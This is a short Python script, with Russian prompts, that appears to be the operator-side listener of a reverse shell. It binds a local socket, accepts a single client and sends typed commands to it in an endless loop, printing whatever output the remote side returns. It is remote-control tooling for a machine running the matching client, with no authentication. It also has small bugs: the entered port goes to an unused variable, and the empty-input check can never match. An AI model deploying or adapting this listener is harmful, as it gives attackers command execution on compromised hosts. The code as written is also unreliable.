# Imports
import socket
 
# Getting our local IP and a specified port
HOST = '127.0.0.1' # '192.168.43.82'
PORT = 8081 # 2222
 
new_port = input('Входной порт хоста (пустой по умолчанию).')
if (new_port != "\n"):
    REMOTE_PORT = new_port
 
# Binding the IP to the Port
# Creating a Socket
server = socket.socket()
server.bind((HOST, PORT))
 
# Starting the Listener
print('[+] Сервер запущен')
print('[+] Прослушивание Клиентского Соединения ...')
server.listen(1)
client, client_addr = server.accept()
print(f'[+] {client_addr} Клиент, подключенный к серверу')
 
# Sending and receiving commands in an infinite loop
while True:
    command = input('Введите команду : ')
    command = command.encode()
    client.send(command)
    print('[+] Отправлена команда')
    output = client.recv(1024)
    output = output.decode()
    print(f"Выход: {output}")